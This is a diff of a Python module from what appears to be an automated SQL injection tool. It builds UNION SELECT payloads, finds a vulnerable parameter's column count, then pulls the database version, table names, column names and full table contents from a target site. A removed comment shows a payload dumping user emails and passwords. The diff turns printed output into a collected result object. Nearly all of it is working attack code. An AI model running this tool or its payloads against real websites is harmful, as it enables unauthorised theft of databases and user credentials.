@@ -1,18 +1,11 @@
-# from utils.ainsi import *
-# from utils.objects.vuln_link import vuln_link 
-
-# import sys, requests
-
-
-
-import requests
 from utils.ainsi import *
 from utils.objects.vuln_link import *
-from urllib.parse import urlparse
+from utils.objects.success_obj import *
+
+import requests
 import re
+from urllib.parse import urlparse
 from bs4 import BeautifulSoup
-
-
 
 def generate_union_select_marker_payload(number):
     buffer = ""
@@ -23,7 +16,7 @@ def generate_union_select_marker_payload(number):
         return None
     
     buffer += base_payload
-    print(len(chars))
+    # print(len(chars))
     for i in range(0, number):
         buffer += "'MARKER_" + chars[i] + "'"
         if i < number - 1:
@@ -58,7 +51,6 @@ def generate_union_payload(base_payload, end_payload, number, start_num):
     buffer += end_payload
     return buffer
 
-# payload = "' UNION SELECT GROUP_CONCAT(CONCAT_WS(':', 'Name', Name, ' Age', Age, ' Rank', Rank, ' Email', Email, ' Password', Password, '\n')),2 ,3 FROM Users -- -"
 
 def generate_union_columns_payload(base_payload, columns_tag ,number, end_payload):
     buffer = None
@@ -81,25 +73,6 @@ def generate_marker_to_find(number):
         chars = sorted(chars)
         return chars   
 
-
-def get_injection(vuln_links):
-    
-    for vuln_link in vuln_links:
-        try :
-            identified_db, link, query_params, success = vuln_link.get_infos()
-            parsed_url = urlparse(link)
-            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
-            # print(f"[{colored(link, RED)}]]")
-            
-            # response = perform_request(link)
-            # response.encoding = "utf-8"
-            
-            # first_page = response.text
-            get_union_based_injection(query_params, base_url)
-            
-
-        except Exception as e:
-            print(f"{colored('ERROR INJECTION : ', RED, styles=UNDERLINE)} {e}")
 
 
 def get_union_lines_response(response):
@@ -158,18 +131,18 @@ def get_union_columns_size(query_params, base_url):
         
     return columns
 
-def get_union_based_injection(query_params, base_url):
-        
+def get_union_based_injection(query_params, base_url, identified_db):
+        payloads = []
         
         #! SEARCH FOR NUM OF COLUMNS
         columns = get_union_columns_size(query_params, base_url)
-        print(f"columns find {colored(str(columns), GREEN, styles=BOLD)}")
         if columns < 1:
             return None
        
         
         #! INJECTING PARAMETERS TO FIND CATEGORY
         payload = generate_union_select_marker_payload(columns)
+        payloads.append(payload)
         params = query_params.copy() if isinstance(query_params, dict) else {}
         param_name = list(params.keys())[0] if params else query_params
         params[param_name] = payload
@@ -180,18 +153,10 @@ def get_union_based_injection(query_params, base_url):
 
         #! 1 : FINDING MARKER POS IN PAGE
         base_lines = get_union_lines_response(response)
-        
-        print(f"{colored(payload, background=BG_RED)}")
-        for element in base_lines:            
-            if element == '\n': 
-                pass
-            else:
-                print(f"[{colored(element, GREEN)}]")
-            
-        #! 2 : FINDING VERSION AND SCHEMA  
-
-    
+                    
+        #! 2 : FINDING VERSION AND SCHEMA
         payload = generate_union_payload("' UNION SELECT CONCAT(@@version,0x3a,schema())", "-- -", columns, 1)
+        payloads.append(payload)
         params = query_params.copy() if isinstance(query_params, dict) else {}
         
         param_name = list(params.keys())[0] if params else query_params
@@ -200,15 +165,14 @@ def get_union_based_injection(query_params, base_url):
         
         soup = BeautifulSoup(response.text, "html.parser")
         lines_table = soup.find_all(string=True)
-        
-        print(f"{colored(payload, background=BG_RED)}")
-                
+                        
         for base_line, lines_table in zip(base_lines, lines_table):
             if base_line in marker_to_find and not lines_table.isdigit():
-                print(f"{colored(lines_table, background=BG_GREEN)}") 
+                version = lines_table 
         
         #! 3 : FINDING TABLE NAME 
         payload = generate_union_payload("' UNION SELECT GROUP_CONCAT(table_name)", " FROM information_schema.tables WHERE table_schema=DATABASE()-- -", columns, 1)
+        payloads.append(payload)
         params = query_params.copy() if isinstance(query_params, dict) else {}
         
         param_name = list(params.keys())[0] if params else query_params
@@ -217,9 +181,7 @@ def get_union_based_injection(query_params, base_url):
         
         soup = BeautifulSoup(response.text, "html.parser")
         lines_table = soup.find_all(string=True)
-        
-        print(f"{colored(payload, background=BG_RED)}")
-                
+                        
         table_tags = []       
         #? COMPARING BASE_LINE
         for base_line, tables_line in zip(base_lines, lines_table):
@@ -228,11 +190,11 @@ def get_union_based_injection(query_params, base_url):
                     table_tags.extend(tables_line.split(','))
         
         #! 4 : FINDING COLUMN_NAME
+        tables_obj = []
         for tag in table_tags:
-            print(f"{colored(tag, background=BG_MAGENTA)} ")            
-
+            # print(f"TABLE : {colored(tag, background=BG_MAGENTA)} ")            
             payload = generate_union_payload("' UNION SELECT GROUP_CONCAT(column_name)", f" FROM information_schema.columns WHERE table_name='{tag}'-- -", columns, 1)
-
+            payloads.append(payload)
             params = query_params.copy() if isinstance(query_params, dict) else {}
         
             param_name = list(params.keys())[0] if params else query_params
@@ -242,7 +204,7 @@ def get_union_based_injection(query_params, base_url):
             soup = BeautifulSoup(response.text, "html.parser")
             lines_columns = soup.find_all(string=True)
             
-            print(f"{colored(payload, background=BG_RED)}")
+            # print(f"FINDING COLUMNS : {colored(payload, background=BG_RED)}")
             
             columns_tag = []
             for base_line, line_columns in zip(base_lines, lines_columns):
@@ -250,8 +212,14 @@ def get_union_based_injection(query_params, base_url):
                     if isinstance(line_columns, str):
                         columns_tag.extend(line_columns.split(','))
             
+            # print("TAG : ", end="")
+            # for tag_print in columns_tag:
+            #     print(f"{colored(tag_print, background=BG_BLUE)} ", end="")
+            # print()
+            
+            #! 5 : DISPLAY ALL COLUMNS
             payload = generate_union_columns_payload("' UNION SELECT GROUP_CONCAT(CONCAT_WS(':'", columns_tag, columns,f" FROM {tag} -- -")
-            print(f"{colored(payload, background=BG_BLUE)}") 
+            payloads.append(payload)
             
             params = query_params.copy() if isinstance(query_params, dict) else {}
         
@@ -262,17 +230,13 @@ def get_union_based_injection(query_params, base_url):
             soup = BeautifulSoup(response.text, "html.parser")
             lines_columns = soup.find_all(string=True)
             
-            print(f"{colored(payload, background=BG_RED)}")
+            # print(f"COLUMNS  INFO : {colored(payload, background=BG_RED)}")
                 
             for base_line, line_columns in zip(base_lines, lines_columns):
                 if base_line in marker_to_find and not line_columns.isdigit():
-                    print(f"{colored(line_columns, background=BG_GREEN)}")
+                    # print(f"{colored(line_columns, background=BG_GREEN)}")
+                    tables_obj.append(Table_obj(tag, columns_tag, line_columns))
             
-            print()
+            success = Success_obj(True, identified_db, version, tables_obj, payloads)
             
-        #! 5 : DISPLAY ALL COLUMNS
-        # payload = "' UNION SELECT 1,GROUP_CONCAT(CONCAT_WS(':', 'Name', Name, ' Age', Age, ' Rank', Rank, ' Email', Email, ' Password', Password, '\n')),3 FROM Users -- -"
-        
-        # 
-        
-
+        return success
